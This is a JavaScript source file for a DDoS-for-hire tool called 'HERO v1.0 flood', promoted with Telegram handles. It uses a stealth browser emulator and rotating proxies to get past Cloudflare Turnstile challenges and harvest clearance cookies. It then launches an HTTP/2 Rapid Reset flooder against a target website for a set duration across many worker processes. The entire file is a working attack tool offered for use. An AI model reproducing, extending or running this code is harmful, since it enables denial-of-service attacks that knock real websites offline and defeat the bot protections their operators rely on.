const Hero = require('@ulixee/hero');
const { ClientPlugin, CorePlugin } = require('@ulixee/hero-plugin-utils');
const { DefaultBrowserEmulator } = require('@unblocked-web/default-browser-emulator');

const cluster = require('cluster');
const colors = require('colors');
const axios = require('axios');
const fs = require('fs');
const os = require('os');

const { spawn } = require('child_process');

process.on("uncaughtException", function (error) {
    console.log(error)
});
process.on("unhandledRejection", function (error) {
    console.log(error)
});

process.setMaxListeners(0);

if (process.argv.length < 7) {
    console.clear();
    console.log(`\n                         ${'ulixee free'.red.bold} ${'|'.bold} ${'an army for hire'.bold}`);
    console.log('')
    console.log(colors.cyan("                                       t.me/resetcve"));
    console.log(`
    ${`${'HERO v1.0 flood'.underline} | advanced debugging, user-agent options,
                      built-in synchronised proxy checker, browser emulator, rapidreset flooder.`.italic}

    ${'Usage:'.bold.underline}

        ${`xvfb-run node HERO.js ${'['.red.bold}target${']'.red.bold} ${'['.red.bold}duration${']'.red.bold} ${'['.red.bold}threads${']'.red.bold} ${'['.red.bold}rate${']'.red.bold} ${'['.red.bold}proxy${']'.red.bold} ${'('.red.bold}options${')'.red.bold}`.italic}
        ${'xvfb-run node HERO.js https://atlasapi.co 60 3 90 proxy.txt --debug true --proxy 1'.italic}

    ${'Options:'.bold.underline}

        --debug         ${'true'.green}        ${'-'.red.bold}   ${`Enable advanced debugging.`.italic}
        --proxy         ${'1'.yellow}/${'2'.yellow}         ${'-'.red.bold}   ${'Proxy type [1: http], [2: socks5].'.italic}
        --verify        ${'true'.green}        ${'-'.red.bold}   ${`Enable built-in proxy checker.`.italic}
        --platform      ${'1'.yellow}/${'2'.yellow}/${'3'.yellow}       ${'-'.red.bold}   ${`Brand [1: Mac], [2: Windows], [3: Random].`.italic}
        --optimize      ${'true'.green}        ${'-'.red.bold}   ${`Optimize memory and CPU usage`}
    `);
    process.exit(0)
};

const target = process.argv[2]// || 'https://localhost:443';
const duration = parseInt(process.argv[3])// || 0;
const threads = parseInt(process.argv[4]) || 10;
const rate = process.argv[5] || 64;
const proxyfile = process.argv[6] || 'proxies.txt';

function error(msg) {
    console.log(`   ${'['.red}${'error'.bold}${']'.red} ${msg}`)
    process.exit(0)
}

function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

const options = [
    { flag: '--debug', value: get_option('--debug') },
    { flag: '--proxy', value: get_option('--proxy') },
    { flag: '--verify', value: get_option('--verify') },
    { flag: '--platform', value: get_option('--platform') },
    { flag: '--headless', value: get_option('--headless') },
    { flag: '--optimize', value: get_option('--optimize') }
];

function enabled(buf) {
    var flag = `--${buf}`;
    const option = options.find(option => option.flag === flag);

    if (option === undefined) { return false; }

    const optionValue = option.value;

    if (optionValue === "true" || optionValue === true) {
        return true;
    } else if (optionValue === "false" || optionValue === false) {
        return false;
    } else if (!isNaN(optionValue)) {
        return parseInt(optionValue);
    } else {
        return false;
    }
}

if (!proxyfile) { error("Invalid proxy file!") }
if (!target || !target.startsWith('https://')) { error("Invalid target address (https only)!") }
if (!duration || isNaN(duration) || duration <= 0) { error("Invalid duration format!") }
if (!threads || isNaN(threads) || threads <= 0) { error("Invalid threads format!") }
if (!rate || isNaN(rate) || rate <= 0) { error("Invalid ratelimit format!") }

const proxies = fs.readFileSync(proxyfile, "utf-8").toString().replace(/\r/g, "").split("\n").filter((word) => word.trim().length > 0);
if (proxies.length <= 0) { error("Proxy file is empty!") }

var parsed = new URL(target);
var platforms = ["mac", "windows"];
var blockedResources = ['BlockCssAssets', 'BlockImages', 'BlockFonts', 'BlockIcons', 'BlockMedia'];

let proxyChunks = [];
for (let i = 0; i < threads; i++) {
    proxyChunks.push([]);
}
proxies.forEach((proxy, index) => {
    proxyChunks[index % threads].push(proxy);
});

function log(string) {
    let d = new Date();
    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();

    if (isNaN(hours) || isNaN(minutes) || isNaN(seconds)) {
        hours = "undefined";
        minutes = "undefined";
        seconds = "undefined";
    }

    console.log(`(${`${hours}:${minutes}:${seconds}`.cyan}) ${string}`);
}

const pluginId = "@ulixee/execute-js-plugin";

class ExecuteJsClientPlugin extends ClientPlugin {

    static id = pluginId;
    static coreDependencyIds = [pluginId];

    onHero(hero, sendToCore) {
        hero.executeJs = this.executeJs.bind(this, sendToCore);
    }

    onTab(hero, tab, sendToCore) {
        tab.executeJs = this.executeJs.bind(this, sendToCore);
    }

    onFrameEnvironment(hero, frameEnvironment, sendToCore) {
        frameEnvironment.executeJs = this.executeJs.bind(this, sendToCore);
    }

    executeJs(sendToCore, fn, ...args) {
        let fnName = '';
        let fnSerialized = fn;
        if (typeof fn !== 'string') {
            fnName = fn.name;
            fnSerialized = `(${fn.toString()})(${JSON.stringify(args).slice(1, -1)});`;
        }
        return sendToCore(pluginId, {
            fnName,
            fnSerialized,
            args,
            isolateFromWebPageEnvironment: false,
        });
    }
}

class ExecuteJsCorePlugin extends CorePlugin {
    static id = pluginId;

    async onClientCommand({ frame, page }, args) {
        const { fnName, fnSerialized, isolateFromWebPageEnvironment } = args;
        frame = frame || page.mainFrame;
        const result = await frame.evaluate(fnSerialized, isolateFromWebPageEnvironment, {
            includeCommandLineAPI: true,
        });

        if (result.error) {
            this.logger.error(fnName, { error: result.error });
            throw new Error(result.error);
        } else {
            return result;
        }
    }
}


async function main(proxy) {
    let platform = 'mac'

    switch (enabled('platform')) {
        case 1:
            platform = 'mac';
            break;
        case 2:
            platform = 'windows';
            break;
        case 3:
            platform = platforms[Math.floor(Math.random() * platforms.length)];
            break;
        default:
            platform = 'mac';
            break;
    }

    let proxy_type;

    switch (enabled('proxy')) {
        case 1:
            proxy_type = 'http';
            break;
        case 2:
            proxy_type = 'socks5';
            break;
        default:
            proxy_type = 'http'
    }

    const hero = new Hero({
        showChrome: false,//enabled('headless') ? false : true,
        userAgent: `~ chrome > 119 && ${platform}`,
        upstreamProxyUrl: `${proxy_type}://${proxy}`,
        showChromeInteractions: true,
        sessionPersistence: false,
        showChromeAlive: false,
        blockedResourceTypes: enabled('optimize') ? blockedResources : ['None'],
        launchArgs: [
            '--start-maximized',
            '--disable-blink-features=AutomationControlled',
            '--disable-features=IsolateOrigins,site-per-process',
            '--use-fake-device-for-media-stream',
            '--use-fake-ui-for-media-stream',
            '--disable-dev-shm-usage',
            '--disable-software-rasterizer',
            '--enable-features=NetworkService',
            '--no-sandbox',
            '--ignore-certificate-errors',
            '--ignore-certificate-errors-spki-list',
            '--ignore-certificate-errors-cert-authority',
            '--disable-popup-blocking',
        ]
    });

    await hero.use(DefaultBrowserEmulator)
    await hero.use(ExecuteJsClientPlugin);
    await hero.use(ExecuteJsCorePlugin)

    const meta = await hero.meta;
    //console.log("meta:", meta);
    log(`[${'HERO'.bold}] | (${colors.magenta(`${proxy}`.underline)}) User-Agent: ${colors.yellow(`${meta.userAgentString}`.italic)}`);


    await hero.goto(target, { referrer: 'https://google.com', timeoutMs: 15000 });
    const cookieStorage = hero.activeTab.cookieStorage;
    await hero.waitForPaintingStable();

    const { document } = hero.activeTab;

    async function turnstile() {
        const frames = await hero.frameEnvironments;
        for (const frame of await frames) {
            const frame_url = await frame.url;
            if (frame_url.includes('challenges.cloudflare.com')) {
                log(`[${'HERO'.bold}] | (${colors.magenta(`${proxy}`.underline)}) ${colors.red("Cloudflare Turnstile Detected")}`);
                await new Promise(resolve => setTimeout(resolve, 3000));
                // const _title = await frame.executeJs(() => {
                //     return window.document.title;
                // })

                const inputs = await frame.querySelectorAll('input');
                for (const input of await inputs) {
                    const coordinates = await input.getBoundingClientRect();
                    log(`[${'HERO'.bold}] | (${colors.magenta(`${proxy}`.underline)}) ${`Turnstile Coordinates [${colors.bold(`x: ${coordinates.x}`)}, ${colors.bold(`y: ${coordinates.y}`)}]`}`);

                    await hero.interact({ move: [coordinates.x, coordinates.y] });
                    //await hero.interact({click: [coordinates.x, coordinates.y]});
                    log(`[${'HERO'.bold}] | (${colors.magenta(`${proxy}`.underline)}) ${colors.green("Cloudflare Turnstile Solved")}`);

                    await input.click();
                    await new Promise(resolve => setTimeout(resolve, 6000));
                }
            }
        }
    }

    const title = await document.title;

    log(`[${'HERO'.bold}] | (${colors.magenta(`${proxy}`.underline)}) Title: ${colors.italic.underline(title)}`);

    if (title === "Just a moment...") {
        await turnstile();
    }

    const cookies = await cookieStorage.getItems();
    const cookieString = cookies.map((c) => `${c.name}=${c.value}`).join("; ");
    log(`[${'HERO'.bold}] | (${colors.magenta(`${proxy}`.underline)}) Cookies: ${colors.green(cookieString)}`);
    //await new Promise(resolve => setTimeout(resolve, 6000));
    flooder(proxy, meta.userAgentString, cookieString);
    await hero.close();
}

async function flooder(proxy, ua, cookie) {
    let args = [
        "rapidreset.js",
        "GET",
        target,
        duration,
        "1", //threads
        rate,
        proxyfile, //proxyfile
        "--useragent", `"${ua}"`,
        //"--ip", `"${proxy}"`
    ];

    if (cookie) {
        args = [
            ...args,
            "--cookie", `"${cookie}"`
        ];
    }

    console.log(args)


    log(`[${'HERO'.bold}] | (${colors.magenta(`${proxy}`.underline)}) ${colors.blue('Starting flooder')}`);

    const xyeta = spawn('node', args, {
        stdio: 'pipe'
    })

    xyeta.stdout.on('data', (data) => {
        console.log(`RESET: ${data}`);
    });
}

async function check(worker, id, proxy) {
    const [ip, port] = proxy.split(':');

    return await new Promise((resolve, reject) => {
        axios.get(`http://google.com`, {
            headers: {
                "User-Agent": "curl/7.58.0"
            },
            proxy: {
                host: ip,
                port: parseInt(port)
            },
            timeout: 10000,
        })
            .then(response => {
                if (response.status === 200) {
                    if (enabled('debug')) {
                        log(`[${'HERO'.bold}] | Process: [${colors.bold(id)}], ${`${proxy}`.magenta.underline}, ${`Working proxy`.green}`);
                    }
                    worker.send({ workingProxy: proxy });
                    return resolve();
                }
                return resolve();
            })
            .catch(error => {
                //console.log("error:", error)
                // if (enabled('debug')) {
                //     log(`[${'HERO'.bold}] | ${`${proxy}`.magenta.underline}, ${`Dead proxy`.red}`);
                // }
                return resolve()
            });
    });
}


function start(id) {
    let proxy;
    if (enabled('verify')) {
        const i = setInterval(() => {
            while (global.working_proxies.length >= 1) {
                proxy = global.working_proxies[Math.floor(Math.random() * global.working_proxies)];
                clearInterval(i);
                main(proxy);
            }
        }, 1000)
    } else {
        proxy = proxyChunks[id][Math.floor(Math.random() * proxyChunks[id].length)];
        main(proxy);
    }
}

if (cluster.isMaster) {
    let _options = ""
    for (var x = 0; x < options.length; x++) {
        if (options[x].value !== undefined) {
            _options += `${(options[x].flag).replace('--', '')}, `;
        }
    }

    console.clear();
    console.log(`\n         ${'ATLAS API CORPORATION'.red.bold} ${'|'.bold} ${'an army for hire'.bold}`);
    console.log('')
    console.log(colors.cyan("                        t.me/benshii"));
    console.log(`
            ${'METHOD'.bold}      ${'-'.red}   ${'['.red} ${`HERO`.italic} ${']'.red} 
            ${'TARGET'.bold}      ${'-'.red}   ${'['.red} ${`${parsed.host}`.italic} ${']'.red} 
            ${'TIME'.bold}        ${'-'.red}   ${'['.red} ${`${duration}`.italic} ${']'.red} 
            ${'THREADS'.bold}     ${'-'.red}   ${'['.red} ${`${threads}`.italic} ${']'.red} 
            ${'OPTIONS'.bold}     ${'-'.red}   ${'['.red} ${`${_options}`.italic} ${']'.red}`);


    Array.from({ length: threads }, (_, i) => {
        const worker = cluster.fork({ WORKER_ID: i, PROXY_CHUNKS: JSON.stringify(proxyChunks) });
        if (enabled('verify')) {
            Promise.all(proxyChunks[i].map((x) => check(worker, i, x)))
        }

    });

    cluster.on('exit', (worker) => {
        log(`Worker ${worker.process.pid} died. Restarting...`);
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    setTimeout(() => process.exit(log('Attack has ended')), duration * 1000);

} else {
    const workerId = parseInt(process.env.WORKER_ID, 10);
    proxyChunks = JSON.parse(process.env.PROXY_CHUNKS);

    global.working_proxies = global.working_proxies || [];

    process.on('message', (msg) => {
        //console.log(`ID: ${workerId}, msg: ${msg.workingProxy}`);
        if (msg.workingProxy) {
            global.working_proxies.push(msg.workingProxy);
        }
    });

    start(workerId);
    setTimeout(() => process.exit(log(`Thread ${process.pid} quitting...`)), duration * 1000);
}